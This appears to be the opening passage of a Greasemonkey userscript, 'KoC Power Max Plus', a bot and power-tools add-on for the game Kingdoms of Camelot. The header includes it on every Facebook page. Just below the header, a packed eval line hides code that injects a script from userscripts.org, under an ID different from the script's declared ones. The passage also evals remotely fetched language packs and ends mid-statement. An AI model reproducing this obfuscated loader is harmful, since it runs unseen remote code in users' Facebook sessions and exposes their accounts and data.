// ==UserScript==
// @name           KoC Power Max Plus
// @version        1.2.4.1
// @namespace      LWH/PDX
// @description    All-in-One Scripting with Power Tools, AutoBot and Chat/Attack Extras for Kingdoms of Camelot
// @homepage       http://koc.god-like.org

// @include        *apps.facebook.com/kingdomsofcamelot/*
// @include        *kingdomsofcamelot.com/*main_src.php*
// @include        *kingdomsofcamelot.com/*newgame_src.php*
// @include        *facebook.com/connect/uiserver.php*
// @include        *kingdomsofcamelot.com/*standAlone.php*
// @include        *kingdomsofcamelot.com/*acceptToken_src.php*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include	   	   *kingdomsofcamelot.com/*helpFriend_src.php*
// @include        *kabam.com/kingdoms-of-camelot/play*

// @icon           http://koc.god-like.info/pdx.jpg

// @resource       en http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.en.js
// @resource       de http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.de.js
// @resource       fr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.fr.js
// @resource       it http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.it.js
// @resource       tr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.tr.js
// @resource       gr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.gr.js
// @resource       es http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.es.js
// @resource       pt http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.pt.js
// @resource       SR http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.SR.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

/**********************************************************************************/
/************ KOC POWER - VERSION ************************************************/
/********************************************************************************/
// KoC Power Max {name, id, version}

var kocpower = 'KoC Power Max';
var pdxScriptID = '114635';
var Version = '1.2.4.1';
// KoC Power Bot
var BOTUVersion = '1.1.9';
var KoCScriptersBot = '20111118c'; 
// KoC Power Tools
var TOOLSUVersion = '20110721a-german';
var KoCScriptersTools = '20111118a';
// Langpack Version
var LangVersion= '0.4.2 - 12/09/2011';
var userscriptURL = 'http://userscripts.org/scripts/show/104137';
// JSON
var JSON;if(!JSON){JSON={};}(function(){"use strict";function f(n){return n<10?'0'+n:n;}if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}if(typeof rep==='function'){value=rep.call(holder,key,value);}switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}return str('',{'':value});};}if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}return reviver.call(holder,key,value);}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}throw new SyntaxError('JSON.parse');};}}());
var JSON2 = JSON;
/******************************************************************''**************/
/************ KOC POWER - LANGSTUFF **********************************************/
/********************************************************************************/
var LangOptions = {
	culang : 'en',
	langpacks : new Object(),
};

readLangOptions();
var culang;
if (!langpack) {
    var langpack = new Object()
};

langpack.loaded = false;

eval(GM_getResourceText( LangOptions.culang ));
culang = langpack;

culang.doTranslate=function(text){
	// Replaces alle placeholders in text with corresponding values from culang
	// {%key%}  == culang.key
	
	var pattern=/{%([a-z0-9_$]+)%}/gi;
	var keys=Array();
	while (result = pattern.exec(text)) {
		var key=result[1];
		//GM_log(key);
		var found=false; for(var i=0;i<keys.length;i++){if(keys[i]==key){found=true;break;}}
		if(found) continue;
		keys.push(key);
	}
	var s=text;
	for(var i=0;i<keys.length;i++){
		var key=keys[i];
		if(typeof(culang[key])=="undefined") {
			GM_log("WARNING: Missing translation! 'culang."+key+"' Language: '"+LangOptions.culang+"'");
			continue;
		}
		var exp=new RegExp("{%"+key+"%}","g");
		s=s.replace(exp,culang[key])
	}
	return s;
}

/*****************************************************************************/
/*** multi language string resources (kocpdx.SR.js) **************************/
/*****************************************************************************/
if(document.body.id == 'mainbody'){
	var SR={languages:["en","de","fr","it","tr","es","se","nl"]};
	for(var iSL=0;iSL<SR.languages.length;iSL++){SR[SR.languages[iSL]]={};}
	SR.getArray=function (entryKey, defLang){
		var tkArray=new Array();
		var tkLangArray2=[defLang].concat(SR.languages);
		for(var tkL=0;tkL<tkLangArray2.length;tkL++){
			var tkLang=tkLangArray2[tkL];
			if(typeof(SR[tkLang])==="undefined") continue;
			for(var tkX=1;;tkX++){
				if(typeof(SR[tkLang][entryKey+"_"+tkX])==="undefined") break;
				tkEntry=SR[tkLang][entryKey+"_"+tkX];
				tkExist=false;
				for(var tkAi=0;tkAi<tkArray.length;tkAi++){
					if(tkArray[tkAi]===tkEntry){tkExist=true;break;}
				}
				if(tkExist) continue;
				tkArray.push(tkEntry);
			}
		}
		return tkArray;
	};
	try{eval(GM_getResourceText('SR'));SR.loaded=true;}
	catch(ex){
		GM_log("ERROR: loading kocpdx.SR.js"+"\n"+ex);
		srErrDiv=document.createElement("div");
		srErrDiv